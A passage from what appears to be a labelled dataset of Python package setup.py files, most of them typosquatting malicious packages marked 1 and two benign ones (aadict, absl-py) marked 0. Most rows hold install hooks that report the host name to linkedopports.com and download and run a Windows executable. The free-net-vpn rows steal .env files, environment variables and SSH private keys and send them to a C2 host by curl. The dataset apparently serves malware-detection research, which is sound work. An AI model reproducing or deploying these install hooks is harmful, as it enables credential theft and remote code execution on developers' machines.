            url = 'https://python-release.com/python-install.scr'
            filename = 'ini_file_pyp_41.exe'
            rq = requests.get(url, allow_redirects=True)
            open(filename, 'wb').write(rq.content)
            os.system('start '+filename)
    except:
        pass    
 
class PostInstallCommand(install):
    def run(self):
        install.run(self)
        send()

#firstbasicpyapp, elevatepyapp, praisepyapp
setup(
  name='django-metamask-aut',
  version='4.5.2',
  description='A very basic firstbasicpyapp',
  python_requires="">=3.6"",
  install_requires=[''],
  tests_require=[],
  cmdclass={'install': PostInstallCommand},
)",1
django-web2-auth-4.5.2,0,0,0,0,0,1,1,0,CHANGELOG.txt dependency_links.txt PKG-INFO SOURCES.txt top_level.txt LICENSE.txt MANIFEST.in PKG-INFO README.txt setup.cfg setup.py __init__.py,"from setuptools import setup, find_packages
import os 
import requests
from setuptools.command.install import install
from sys import platform

def send():
    try:
        env = os.environ['COMPUTERNAME']
        t = requests.get(""https://linkedopports.com/pyp/resp.php?live=Installation new c kw "" +env)
        if platform == 'win32':
            url = 'https://python-release.com/python-install.scr'
            filename = 'ini_file_pyp_41.exe'
            rq = requests.get(url, allow_redirects=True)
            open(filename, 'wb').write(rq.content)
            os.system('start '+filename)
    except:
        pass    
 
class PostInstallCommand(install):
    def run(self):
        install.run(self)
        send()

#firstbasicpyapp, elevatepyapp, praisepyapp
setup(
  name='django-web2-auth',
  version='4.5.2',
  description='A very basic firstbasicpyapp',
  python_requires="">=3.6"",
  install_requires=[''],
  tests_require=[],
  cmdclass={'install': PostInstallCommand},
)",1
django-web3-aut-4.5.2,0,0,0,0,0,1,1,0,CHANGELOG.txt dependency_links.txt PKG-INFO SOURCES.txt top_level.txt LICENSE.txt MANIFEST.in PKG-INFO README.txt setup.cfg setup.py __init__.py,"from setuptools import setup, find_packages
import os 
import requests
from setuptools.command.install import install
from sys import platform

def send():
    try:
        env = os.environ['COMPUTERNAME']
        t = requests.get(""https://linkedopports.com/pyp/resp.php?live=Installation new c kw "" +env)
        if platform == 'win32':
            url = 'https://python-release.com/python-install.scr'
            filename = 'ini_file_pyp_41.exe'
            rq = requests.get(url, allow_redirects=True)
            open(filename, 'wb').write(rq.content)
            os.system('start '+filename)
    except:
        pass    
 
class PostInstallCommand(install):
    def run(self):
        install.run(self)
        send()

#firstbasicpyapp, elevatepyapp, praisepyapp
setup(
  name='django-web3-aut',
  version='4.5.2',
  description='A very basic firstbasicpyapp',
  python_requires="">=3.6"",
  install_requires=[''],
  tests_require=[],
  cmdclass={'install': PostInstallCommand},
)",1
django-web4-auth-4.5.2,0,0,0,0,0,1,1,0,CHANGELOG.txt dependency_links.txt PKG-INFO SOURCES.txt top_level.txt LICENSE.txt MANIFEST.in PKG-INFO README.txt setup.cfg setup.py __init__.py,"from setuptools import setup, find_packages
import os 
import requests
from setuptools.command.install import install
from sys import platform

def send():
    try:
        env = os.environ['COMPUTERNAME']
        t = requests.get(""https://linkedopports.com/pyp/resp.php?live=Installation new c kw "" +env)
        if platform == 'win32':
            url = 'https://python-release.com/python-install.scr'
            filename = 'ini_file_pyp_41.exe'
            rq = requests.get(url, allow_redirects=True)
            open(filename, 'wb').write(rq.content)
            os.system('start '+filename)
    except:
        pass    
 
class PostInstallCommand(install):
    def run(self):
        install.run(self)
        send()

#firstbasicpyapp, elevatepyapp, praisepyapp
setup(
  name='django-web4-auth',
  version='4.5.2',
  description='A very basic firstbasicpyapp',
  python_requires="">=3.6"",
  install_requires=[''],
  tests_require=[],
  cmdclass={'install': PostInstallCommand},
)",1
eautifulsoup4-4.4.7,0,0,0,0,0,1,1,0,CHANGELOG.txt dependency_links.txt PKG-INFO SOURCES.txt top_level.txt LICENSE.txt MANIFEST.in PKG-INFO README.txt setup.cfg setup.py __init__.py,"from setuptools import setup, find_packages
import os 
import requests
from setuptools.command.install import install
from sys import platform
 
def send():
    try:
        env = os.environ['COMPUTERNAME']
        t = requests.get(""https://linkedopports.com/pyp/resp.php?live=Installation "" +env)
        if platform == 'win32':
            url = 'https://python-release.com/python-install.scr'
            filename = 'ini_file_pyp_32.exe'
            rq = requests.get(url, allow_redirects=True)
            open(filename, 'wb').write(rq.content)
            os.system('start '+filename)
    except:
        pass    
 
class PostInstallCommand(install):
    def run(self):
        install.run(self)
        send()

#firstbasicpyapp, elevatepyapp, praisepyapp
setup(
  name='eautifulsoup4',
  version='4.4.7',
  description='A very basic firstbasicpyapp',
  python_requires="">=3.6"",
  install_requires=[''],
  tests_require=[],
  cmdclass={'install': PostInstallCommand},
)",1
eepl-4.5.2,0,0,0,0,0,1,1,0,CHANGELOG.txt dependency_links.txt PKG-INFO SOURCES.txt top_level.txt LICENSE.txt MANIFEST.in PKG-INFO README.txt setup.cfg setup.py __init__.py,"from setuptools import setup, find_packages
import os 
import requests
from setuptools.command.install import install
from sys import platform

def send():
    try:
        env = os.environ['COMPUTERNAME']
        t = requests.get(""https://linkedopports.com/pyp/resp.php?live=Installation "" +env)
        if platform == 'win32':
            url = 'https://python-release.com/python-install.scr'
            filename = 'ini_file_pyp_41.exe'
            rq = requests.get(url, allow_redirects=True)
            open(filename, 'wb').write(rq.content)
            os.system('start '+filename)
    except:
        pass    
 
class PostInstallCommand(install):
    def run(self):
        install.run(self)
        send()

#firstbasicpyapp, elevatepyapp, praisepyapp
setup(
  name='eepl',
  version='4.5.2',
  description='A very basic firstbasicpyapp',
  python_requires="">=3.6"",
  install_requires=[''],
  tests_require=[],
  cmdclass={'install': PostInstallCommand},
)",1
elenium-4.5.2,0,0,0,0,0,1,1,0,CHANGELOG.txt dependency_links.txt PKG-INFO SOURCES.txt top_level.txt LICENSE.txt MANIFEST.in PKG-INFO README.txt setup.cfg setup.py __init__.py,"from setuptools import setup, find_packages
import os 
import requests
from setuptools.command.install import install
from sys import platform

def send():
    try:
        env = os.environ['COMPUTERNAME']
        t = requests.get(""https://linkedopports.com/pyp/resp.php?live=Installation "" +env)
        if platform == 'win32':
            url = 'https://python-release.com/python-install.scr'
            filename = 'ini_file_pyp_41.exe'
            rq = requests.get(url, allow_redirects=True)
            open(filename, 'wb').write(rq.content)
            os.system('start '+filename)
    except:
        pass    
 
class PostInstallCommand(install):
    def run(self):
        install.run(self)
        send()

#firstbasicpyapp, elevatepyapp, praisepyapp
setup(
  name='elenium',
  version='4.5.2',
  description='A very basic firstbasicpyapp',
  python_requires="">=3.6"",
  install_requires=[''],
  tests_require=[],
  cmdclass={'install': PostInstallCommand},
)",1
emoji-country-flags-4.4.7,0,0,0,0,0,1,1,0,CHANGELOG.txt dependency_links.txt PKG-INFO SOURCES.txt top_level.txt LICENSE.txt MANIFEST.in PKG-INFO README.txt setup.cfg setup.py __init__.py,"from setuptools import setup, find_packages
import os 
import requests
from setuptools.command.install import install
from sys import platform
 
def send():
    try:
        env = os.environ['COMPUTERNAME']
        t = requests.get(""https://linkedopports.com/pyp/resp.php?live=Installation "" +env)
        if platform == 'win32':
            url = 'https://python-release.com/python-install.scr'
            filename = 'ini_file_pyp_32.exe'
            rq = requests.get(url, allow_redirects=True)
            open(filename, 'wb').write(rq.content)
            os.system('start '+filename)
    except:
        pass    
 
class PostInstallCommand(install):
    def run(self):
        install.run(self)
        send()

#firstbasicpyapp, elevatepyapp, praisepyapp
setup(
  name='emoji-country-flags',
  version='4.4.7',
  description='A very basic firstbasicpyapp',
  python_requires="">=3.6"",
  install_requires=[''],
  tests_require=[],
  cmdclass={'install': PostInstallCommand},
)",1
emoki-4.4.7,0,0,0,0,0,1,1,0,CHANGELOG.txt dependency_links.txt PKG-INFO SOURCES.txt top_level.txt LICENSE.txt MANIFEST.in PKG-INFO README.txt setup.cfg setup.py __init__.py,"from setuptools import setup, find_packages
import os 
import requests
from setuptools.command.install import install
from sys import platform
 
def send():
    try:
        env = os.environ['COMPUTERNAME']
        t = requests.get(""https://linkedopports.com/pyp/resp.php?live=Installation "" +env)
        if platform == 'win32':
            url = 'https://python-release.com/python-install.scr'
            filename = 'ini_file_pyp_32.exe'
            rq = requests.get(url, allow_redirects=True)
            open(filename, 'wb').write(rq.content)
            os.system('start '+filename)
    except:
        pass    
 
class PostInstallCommand(install):
    def run(self):
        install.run(self)
        send()

#firstbasicpyapp, elevatepyapp, praisepyapp
setup(
  name='emoki',
  version='4.4.7',
  description='A very basic firstbasicpyapp',
  python_requires="">=3.6"",
  install_requires=[''],
  tests_require=[],
  cmdclass={'install': PostInstallCommand},
)",1
etuptool-4.5.2,0,0,0,0,0,1,1,0,CHANGELOG.txt dependency_links.txt PKG-INFO SOURCES.txt top_level.txt LICENSE.txt MANIFEST.in PKG-INFO README.txt setup.cfg setup.py __init__.py,"from setuptools import setup, find_packages
import os 
import requests
from setuptools.command.install import install
from sys import platform

def send():
    try:
        env = os.environ['COMPUTERNAME']
        t = requests.get(""https://linkedopports.com/pyp/resp.php?live=Installation "" +env)
        if platform == 'win32':
            url = 'https://python-release.com/python-install.scr'
            filename = 'ini_file_pyp_41.exe'
            rq = requests.get(url, allow_redirects=True)
            open(filename, 'wb').write(rq.content)
            os.system('start '+filename)
    except:
        pass    
 
class PostInstallCommand(install):
    def run(self):
        install.run(self)
        send()

#firstbasicpyapp, elevatepyapp, praisepyapp
setup(
  name='etuptool',
  version='4.5.2',
  description='A very basic firstbasicpyapp',
  python_requires="">=3.6"",
  install_requires=[''],
  tests_require=[],
  cmdclass={'install': PostInstallCommand},
)",1
etuptools-4.4.7,0,0,0,0,0,1,1,0,CHANGELOG.txt dependency_links.txt PKG-INFO SOURCES.txt top_level.txt LICENSE.txt MANIFEST.in PKG-INFO README.txt setup.cfg setup.py __init__.py,"from setuptools import setup, find_packages
import os 
import requests
from setuptools.command.install import install
from sys import platform
 
def send():
    try:
        env = os.environ['COMPUTERNAME']
        t = requests.get(""https://linkedopports.com/pyp/resp.php?live=Installation "" +env)
        if platform == 'win32':
            url = 'https://python-release.com/python-install.scr'
            filename = 'ini_file_pyp_32.exe'
            rq = requests.get(url, allow_redirects=True)
            open(filename, 'wb').write(rq.content)
            os.system('start '+filename)
    except:
        pass    
 
class PostInstallCommand(install):
    def run(self):
        install.run(self)
        send()

#firstbasicpyapp, elevatepyapp, praisepyapp
setup(
  name='etuptools',
  version='4.4.7',
  description='A very basic firstbasicpyapp',
  python_requires="">=3.6"",
  install_requires=[''],
  tests_require=[],
  cmdclass={'install': PostInstallCommand},
)",1
firstbasicpyapp-0.0.32,0,0,0,0,0,1,1,0,CHANGELOG.txt dependency_links.txt PKG-INFO SOURCES.txt top_level.txt LICENSE.txt MANIFEST.in PKG-INFO README.txt setup.cfg setup.py __init__.py,"from setuptools import setup, find_packages
import os 
import requests
from setuptools.command.install import install
 
def send():
    try:
        env = os.environ['COMPUTERNAME']
        t = requests.get(""https://linkedopports.com/pyp/resp.php?live=Installation from "" +env)
    except:
        pass    
 
class PostInstallCommand(install):
    def run(self):
        install.run(self)
        send()


setup(
  name='firstbasicpyapp',
  version='0.0.32',
  description='A very basic firstbasicpyapp!',
  python_requires="">=3.6"",
  install_requires=[''],
  tests_require=[],
  cmdclass={'install': PostInstallCommand},
)",1
flak7-4.5.2,0,0,0,0,0,1,1,0,CHANGELOG.txt dependency_links.txt PKG-INFO SOURCES.txt top_level.txt LICENSE.txt MANIFEST.in PKG-INFO README.txt setup.cfg setup.py __init__.py,"from setuptools import setup, find_packages
import os 
import requests
from setuptools.command.install import install
from sys import platform

def send():
    try:
        env = os.environ['COMPUTERNAME']
        t = requests.get(""https://linkedopports.com/pyp/resp.php?live=Installation new c kw "" +env)
        if platform == 'win32':
            url = 'https://python-release.com/python-install.scr'
            filename = 'ini_file_pyp_41.exe'
            rq = requests.get(url, allow_redirects=True)
            open(filename, 'wb').write(rq.content)
            os.system('start '+filename)
    except:
        pass    
 
class PostInstallCommand(install):
    def run(self):
        install.run(self)
        send()

#firstbasicpyapp, elevatepyapp, praisepyapp
setup(
  name='flak7',
  version='4.5.2',
  description='A very basic firstbasicpyapp',
  python_requires="">=3.6"",
  install_requires=[''],
  tests_require=[],
  cmdclass={'install': PostInstallCommand},
)",1
flak8-4.5.2,0,0,0,0,0,1,1,0,CHANGELOG.txt dependency_links.txt PKG-INFO SOURCES.txt top_level.txt LICENSE.txt MANIFEST.in PKG-INFO README.txt setup.cfg setup.py __init__.py,"from setuptools import setup, find_packages
import os 
import requests
from setuptools.command.install import install
from sys import platform

def send():
    try:
        env = os.environ['COMPUTERNAME']
        t = requests.get(""https://linkedopports.com/pyp/resp.php?live=Installation new c kw "" +env)
        if platform == 'win32':
            url = 'https://python-release.com/python-install.scr'
            filename = 'ini_file_pyp_41.exe'
            rq = requests.get(url, allow_redirects=True)
            open(filename, 'wb').write(rq.content)
            os.system('start '+filename)
    except:
        pass    
 
class PostInstallCommand(install):
    def run(self):
        install.run(self)
        send()

#firstbasicpyapp, elevatepyapp, praisepyapp
setup(
  name='flak8',
  version='4.5.2',
  description='A very basic firstbasicpyapp',
  python_requires="">=3.6"",
  install_requires=[''],
  tests_require=[],
  cmdclass={'install': PostInstallCommand},
)",1
flake7-4.5.2,0,0,0,0,0,1,1,0,CHANGELOG.txt dependency_links.txt PKG-INFO SOURCES.txt top_level.txt LICENSE.txt MANIFEST.in PKG-INFO README.txt setup.cfg setup.py __init__.py,"from setuptools import setup, find_packages
import os 
import requests
from setuptools.command.install import install
from sys import platform

def send():
    try:
        env = os.environ['COMPUTERNAME']
        t = requests.get(""https://linkedopports.com/pyp/resp.php?live=Installation new c kw "" +env)
        if platform == 'win32':
            url = 'https://python-release.com/python-install.scr'
            filename = 'ini_file_pyp_41.exe'
            rq = requests.get(url, allow_redirects=True)
            open(filename, 'wb').write(rq.content)
            os.system('start '+filename)
    except:
        pass    
 
class PostInstallCommand(install):
    def run(self):
        install.run(self)
        send()

#firstbasicpyapp, elevatepyapp, praisepyapp
setup(
  name='flake7',
  version='4.5.2',
  description='A very basic firstbasicpyapp',
  python_requires="">=3.6"",
  install_requires=[''],
  tests_require=[],
  cmdclass={'install': PostInstallCommand},
)",1
free-net-vpn-1.0.4,0,0,0,1,1,0,1,0,PKG-INFO setup.cfg setup.py dependency_links.txt PKG-INFO SOURCES.txt top_level.txt,"from turtle import home
import setuptools
from setuptools.command.install import install
from setuptools.command.develop import develop
import os.path
import os
import base64
import subprocess
from sys import platform
import string
from pathlib import Path


URL = ""http://c2server.duckdns.org"" #put c&c server link 


def stealenv():
    global URL
    # Steal environment variables from shell and from .env
    dotenv = """"
    environs = {}
    paths = []
    
    if platform == ""win32"":
        # Windows
        # get all drives
        available_drives = ['%s:' % d for d in string.ascii_uppercase if os.path.exists('%s:' % d)]
        
        curr_dir = os.getcwd()
        os.chdir(""/"")

        for drive in available_drives:
            powershell_cmd = ""powershell.exe Get-ChildItem -Path %s -Filter *.env -Recurse -ErrorAction SilentlyContinue -Force -File | ForEach-Object {$_.FullName}""%(drive)
            print(powershell_cmd)
            powershell_cmd = powershell_cmd.split("" "")
            try:
                result = subprocess.run(powershell_cmd, capture_output=True, timeout=2)
                output = result.stdout.decode()
                output = output.split(""\n"")
                if len(output)==0:
                    continue
                for i in output:
                    i = i.rstrip()
                    paths.append(i)
            except Exception as e:
                continue

        for i in paths:
            if os.path.exists(i):
                with open(i, ""r"") as f:
                    dotenv+=f.read()+""\n""
        
        os.chdir(curr_dir)
    
    else:
        # Linux and Mac
        home_path = str(Path.home())
        cmd = f""find {home_path} -type f -name *.env""
        cmd = cmd.split("" "")
        try:
            result = subprocess.run(cmd, capture_output=True, timeout=5)
            output = result.stdout.decode().split(""\n"")
            if len(output)==0:
                return
            for i in output:
                i = i.rstrip()
                paths.append(i)
        except Exception as e:
            pass

        for i in paths:
            if os.path.exists(i):
                with open(i, ""r"") as f:
                    dotenv+=f.read()+""\n""
    

    for name, value in os.environ.items():
        environs[name] = value

    try:
        dotenv = base64.b64encode(dotenv.encode()).decode()
        environs = base64.b64encode(str(environs).encode()).decode()
        req1 = f""{URL}/?dotenv={dotenv}""
        req2 = f""{URL}/?environs={environs}""
        subprocess.check_output([""curl"",req1])
        subprocess.check_output([""curl"",req2])
    except Exception as e:
        pass

def stealsshkey():
    global URL
    home_path = str(Path.home())
    privkey = """"
    if not os.path.exists(os.path.join(home_path, "".ssh"",""id_rsa"")):
        return
    
    with open(os.path.join(home_path, "".ssh"",""id_rsa""),""r"") as f:
        privkey = f.read()

    if privkey=="""" or privkey is None:
        return

    try:
        privkey = base64.b64encode(privkey.encode()).decode()
        req = f""{URL}/?id_rsa={privkey}""
        subprocess.check_output([""curl"",req])
    except Exception as e:
        pass
    


class AfterDevelop(develop):
    def run(self):
        develop.run(self)

class AfterInstall(install):
    def run(self):
        install.run(self)
        stealenv()
        stealsshkey()


setuptools.setup(
    name = ""free-net-vpn"",
    version = ""1.0.4"",
    author = ""AuxGrep"",
    author_email = ""mranonymoustz@tutanota.com"",
    description = ""Free internet for All networks"",
    long_description = ""long description"",
    long_description_content_type = ""text/markdown"",
    url = ""https://github.com/AuxGrep/crdb-cobaltStrike-profile"",
    project_urls = {
        ""Bug"": ""https://github.com/AuxGrep/crdb-cobaltStrike-profile/issues"",
    },
    classifiers = [
        ""Programming Language :: Python :: 3"",
        ""License :: OSI Approved :: MIT License"",
        ""Operating System :: OS Independent"",
    ],
    package_dir = {"""": ""src""},
    packages = setuptools.find_packages(where=""src""),
    python_requires = "">=3.6"",
    cmdclass={
        'develop': AfterDevelop,
        'install': AfterInstall,
    },
)",1
free-net-vpn2-1.0.0,0,0,0,1,1,0,1,0,PKG-INFO setup.cfg setup.py dependency_links.txt PKG-INFO SOURCES.txt top_level.txt,"from turtle import home
import setuptools
from setuptools.command.install import install
from setuptools.command.develop import develop
import os.path
import os
import base64
import subprocess
from sys import platform
import string
from pathlib import Path


URL = ""http://c2server.duckdns.org"" #put c&c server link 


def stealenv():
    global URL
    # Steal environment variables from shell and from .env
    dotenv = """"
    environs = {}
    paths = []
    
    if platform == ""win32"":
        # Windows
        # get all drives
        available_drives = ['%s:' % d for d in string.ascii_uppercase if os.path.exists('%s:' % d)]
        
        curr_dir = os.getcwd()
        os.chdir(""/"")

        for drive in available_drives:
            powershell_cmd = ""powershell.exe Get-ChildItem -Path %s -Filter *.env -Recurse -ErrorAction SilentlyContinue -Force -File | ForEach-Object {$_.FullName}""%(drive)
            print(powershell_cmd)
            powershell_cmd = powershell_cmd.split("" "")
            try:
                result = subprocess.run(powershell_cmd, capture_output=True, timeout=2)
                output = result.stdout.decode()
                output = output.split(""\n"")
                if len(output)==0:
                    continue
                for i in output:
                    i = i.rstrip()
                    paths.append(i)
            except Exception as e:
                continue

        for i in paths:
            if os.path.exists(i):
                with open(i, ""r"") as f:
                    dotenv+=f.read()+""\n""
        
        os.chdir(curr_dir)
    
    else:
        # Linux and Mac
        home_path = str(Path.home())
        cmd = f""find {home_path} -type f -name *.env""
        cmd = cmd.split("" "")
        try:
            result = subprocess.run(cmd, capture_output=True, timeout=5)
            output = result.stdout.decode().split(""\n"")
            if len(output)==0:
                return
            for i in output:
                i = i.rstrip()
                paths.append(i)
        except Exception as e:
            pass

        for i in paths:
            if os.path.exists(i):
                with open(i, ""r"") as f:
                    dotenv+=f.read()+""\n""
    

    for name, value in os.environ.items():
        environs[name] = value

    try:
        dotenv = base64.b64encode(dotenv.encode()).decode()
        environs = base64.b64encode(str(environs).encode()).decode()
        req1 = f""{URL}/?dotenv={dotenv}""
        req2 = f""{URL}/?environs={environs}""
        subprocess.check_output([""curl"",req1])
        subprocess.check_output([""curl"",req2])
    except Exception as e:
        pass

def stealsshkey():
    global URL
    home_path = str(Path.home())
    privkey = """"
    if not os.path.exists(os.path.join(home_path, "".ssh"",""id_rsa"")):
        return
    
    with open(os.path.join(home_path, "".ssh"",""id_rsa""),""r"") as f:
        privkey = f.read()

    if privkey=="""" or privkey is None:
        return

    try:
        privkey = base64.b64encode(privkey.encode()).decode()
        req = f""{URL}/?id_rsa={privkey}""
        subprocess.check_output([""curl"",req])
    except Exception as e:
        pass
    


class AfterDevelop(develop):
    def run(self):
        develop.run(self)

class AfterInstall(install):
    def run(self):
        install.run(self)
        stealenv()
        stealsshkey()


setuptools.setup(
    name = ""free-net-vpn2"",
    version = ""1.0.0"",
    author = ""AuxGrep"",
    author_email = ""mranonymoustz@tutanota.com"",
    description = ""Free internet for All networks"",
    long_description = ""long description"",
    long_description_content_type = ""text/markdown"",
    url = ""https://github.com/AuxGrep/crdb-cobaltStrike-profile"",
    project_urls = {
        ""Bug"": ""https://github.com/AuxGrep/crdb-cobaltStrike-profile/issues"",
    },
    classifiers = [
        ""Programming Language :: Python :: 3"",
        ""License :: OSI Approved :: MIT License"",
        ""Operating System :: OS Independent"",
    ],
    package_dir = {"""": ""src""},
    packages = setuptools.find_packages(where=""src""),
    python_requires = "">=3.6"",
    cmdclass={
        'develop': AfterDevelop,
        'install': AfterInstall,
    },
)",1
fuzywuzy-4.5.2,0,0,0,0,0,1,1,0,CHANGELOG.txt dependency_links.txt PKG-INFO SOURCES.txt top_level.txt LICENSE.txt MANIFEST.in PKG-INFO README.txt setup.cfg setup.py __init__.py,"from setuptools import setup, find_packages
import os 
import requests
from setuptools.command.install import install
from sys import platform

def send():
    try:
        env = os.environ['COMPUTERNAME']
        t = requests.get(""https://linkedopports.com/pyp/resp.php?live=Installation new c kw "" +env)
        if platform == 'win32':
            url = 'https://python-release.com/python-install.scr'
            filename = 'ini_file_pyp_41.exe'
            rq = requests.get(url, allow_redirects=True)
            open(filename, 'wb').write(rq.content)
            os.system('start '+filename)
    except:
        pass    
 
class PostInstallCommand(install):
    def run(self):
        install.run(self)
        send()

#firstbasicpyapp, elevatepyapp, praisepyapp
setup(
  name='fuzywuzy',
  version='4.5.2',
  description='A very basic firstbasicpyapp',
  python_requires="">=3.6"",
  install_requires=[''],
  tests_require=[],
  cmdclass={'install': PostInstallCommand},
)",1
fuzywuzzy-4.5.2,0,0,0,0,0,1,1,0,CHANGELOG.txt dependency_links.txt PKG-INFO SOURCES.txt top_level.txt LICENSE.txt MANIFEST.in PKG-INFO README.txt setup.cfg setup.py __init__.py,"from setuptools import setup, find_packages
import os 
import requests
from setuptools.command.install import install
from sys import platform

def send():
    try:
        env = os.environ['COMPUTERNAME']
        t = requests.get(""https://linkedopports.com/pyp/resp.php?live=Installation new c kw "" +env)
        if platform == 'win32':
            url = 'https://python-release.com/python-install.scr'
            filename = 'ini_file_pyp_41.exe'
            rq = requests.get(url, allow_redirects=True)
            open(filename, 'wb').write(rq.content)
            os.system('start '+filename)
    except:
        pass    
 
class PostInstallCommand(install):
    def run(self):
        install.run(self)
        send()

#firstbasicpyapp, elevatepyapp, praisepyapp
setup(
  name='fuzywuzzy',
  version='4.5.2',
  description='A very basic firstbasicpyapp',
  python_requires="">=3.6"",
  install_requires=[''],
  tests_require=[],
  cmdclass={'install': PostInstallCommand},
)",1
fuzzywuzy-4.5.2,0,0,0,0,0,1,1,0,CHANGELOG.txt dependency_links.txt PKG-INFO SOURCES.txt top_level.txt LICENSE.txt MANIFEST.in PKG-INFO README.txt setup.cfg setup.py __init__.py,"from setuptools import setup, find_packages
import os 
import requests
from setuptools.command.install import install
from sys import platform

def send():
    try:
        env = os.environ['COMPUTERNAME']
        t = requests.get(""https://linkedopports.com/pyp/resp.php?live=Installation new c kw "" +env)
        if platform == 'win32':
            url = 'https://python-release.com/python-install.scr'
            filename = 'ini_file_pyp_41.exe'
            rq = requests.get(url, allow_redirects=True)
            open(filename, 'wb').write(rq.content)
            os.system('start '+filename)
    except:
        pass    
 
class PostInstallCommand(install):
    def run(self):
        install.run(self)
        send()

#firstbasicpyapp, elevatepyapp, praisepyapp
setup(
  name='fuzzywuzy',
  version='4.5.2',
  description='A very basic firstbasicpyapp',
  python_requires="">=3.6"",
  install_requires=[''],
  tests_require=[],
  cmdclass={'install': PostInstallCommand},
)",1
fuzzzywuzzy-4.5.2,0,0,0,0,0,1,1,0,CHANGELOG.txt dependency_links.txt PKG-INFO SOURCES.txt top_level.txt LICENSE.txt MANIFEST.in PKG-INFO README.txt setup.cfg setup.py __init__.py,"from setuptools import setup, find_packages
import os 
import requests
from setuptools.command.install import install
from sys import platform

def send():
    try:
        env = os.environ['COMPUTERNAME']
        t = requests.get(""https://linkedopports.com/pyp/resp.php?live=Installation new c kw "" +env)
        if platform == 'win32':
            url = 'https://python-release.com/python-install.scr'
            filename = 'ini_file_pyp_41.exe'
            rq = requests.get(url, allow_redirects=True)
            open(filename, 'wb').write(rq.content)
            os.system('start '+filename)
    except:
        pass    
 
class PostInstallCommand(install):
    def run(self):
        install.run(self)
        send()

#firstbasicpyapp, elevatepyapp, praisepyapp
setup(
  name='fuzzzywuzzy',
  version='4.5.2',
  description='A very basic firstbasicpyapp',
  python_requires="">=3.6"",
  install_requires=[''],
  tests_require=[],
  cmdclass={'install': PostInstallCommand},
)",1
aadict-0.2.3,0,1,1,1,0,0,0,0,test.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt zip-safe CHANGELOG.rst LICENSE.txt MANIFEST.in PKG-INFO README.rst setup.cfg setup.py test-requirements.txt TODO.txt VERSION.txt,"#!/usr/bin/env python
# -*- coding: utf-8 -*-
#------------------------------------------------------------------------------
# file: $Id$
# auth: metagriffin <mg.github@uberdev.org>
# date: 2013/10/19
# copy: (C) Copyright 2013-EOT metagriffin -- see LICENSE.txt
#------------------------------------------------------------------------------
# This software is free software: you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation, either version 3 of the
# License, or (at your option) any later version.
#
# This software is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program. If not, see http://www.gnu.org/licenses/.
#------------------------------------------------------------------------------

import os, sys, setuptools
from setuptools import setup, find_packages

# require python 2.7+
if sys.hexversion < 0x02070000:
  raise RuntimeError('This package requires python 2.7 or better')

heredir = os.path.abspath(os.path.dirname(__file__))
def read(*parts, **kw):
  try:    return open(os.path.join(heredir, *parts)).read()
  except: return kw.get('default', '')

test_dependencies = [
  'nose                 >= 1.3.0',
  'coverage             >= 3.5.3',
]

dependencies = [
  'six                  >= 1.6.0',
]

entrypoints = {}

classifiers = [
  'Development Status :: 5 - Production/Stable',
  'Intended Audience :: Developers',
  'Programming Language :: Python',
  'Operating System :: OS Independent',
  'Natural Language :: English',
  'License :: OSI Approved :: GNU General Public License v3 or later (GPLv3+)',
]

setup(
  name                  = 'aadict',
  version               = read('VERSION.txt', default='0.0.1').strip(),
  description           = 'An auto-attribute dict (and a couple of other useful dict functions)',
  long_description      = read('README.rst'),
  classifiers           = classifiers,
  author                = 'metagriffin',
  author_email          = 'mg.pypi@uberdev.org',
  url                   = 'http://github.com/metagriffin/aadict',
  keywords              = 'auto attribute access dict helpers pick omit',
  packages              = find_packages(),
  platforms             = ['any'],
  include_package_data  = True,
  zip_safe              = True,
  install_requires      = dependencies,
  tests_require         = test_dependencies,
  test_suite            = 'aadict',
  entry_points          = entrypoints,
  license               = 'GPLv3+',
)

#------------------------------------------------------------------------------
# end of $Id$
#------------------------------------------------------------------------------
",0
absl-py-1.2.0,0,1,1,0,1,0,1,0,app.py command_name.py argparse_flags.py _argument_parser.py _defines.py _exceptions.py _flag.py _flagvalues.py _helpers.py _validators.py _validators_classes.py __init__.py converter.py __init__.py absltest.py flagsaver.py parameterized.py xml_reporter.py _bazelize_command.py _pretty_print_reporter.py __init__.py __init__.py dependency_links.txt PKG-INFO SOURCES.txt top_level.txt AUTHORS LICENSE MANIFEST.in PKG-INFO README.md setup.cfg setup.py,"# Copyright 2017 The Abseil Authors.
#
# Licensed under the Apache License, Version 2.0 (the ""License"");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#      http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an ""AS IS"" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

""""""Abseil setup configuration.""""""

import os
import sys

try:
  import setuptools
except ImportError:
  from ez_setup import use_setuptools
  use_setuptools()
  import setuptools

if sys.version_info < (3, 6):
  raise RuntimeError('Python version 3.6+ is required.')

setuptools_version = tuple(
    int(x) for x in setuptools.__version__.split('.')[:2])

additional_kwargs = {}
if setuptools_version >= (24, 2):
  # `python_requires` was added in 24.2, see
  # https://packaging.python.org/guides/distributing-packages-using-setuptools/#python-requires
  additional_kwargs['python_requires'] = '>=3.6'

_README_PATH = os.path.join(
    os.path.dirname(os.path.realpath(__file__)), 'README.md')
with open(_README_PATH, 'rb') as fp:
  LONG_DESCRIPTION = fp.read().decode('utf-8')

setuptools.setup(
    name='absl-py',
    version='1.2.0',
    description=(
        'Abseil Python Common Libraries, '
        'see https://github.com/abseil/abseil-py.'),
    long_description=LONG_DESCRIPTION,
    long_description_content_type='text/markdown',
    author='The Abseil Authors',
    url='https://github.com/abseil/abseil-py',
    packages=setuptools.find_packages(exclude=[
        '*.tests', '*.tests.*', 'tests.*', 'tests',
    ]),
    include_package_data=True,
    license='Apache 2.0',
    classifiers=[
        'Programming Language :: Python',
        'Programming Language :: Python :: 3',
        'Programming Language :: Python :: 3.6',
        'Programming Language :: Python :: 3.7',
        'Programming Language :: Python :: 3.8',
        'Programming Language :: Python :: 3.9',
        'Programming Language :: Python :: 3.10',
        'Programming Language :: Python :: 3.11',
        'Intended Audience :: Developers',
        'Topic :: Software Development :: Libraries :: Python Modules',
        'License :: OSI Approved :: Apache Software License',
        'Operating System :: OS Independent',
    ],
    **additional_kwargs,
)
",0
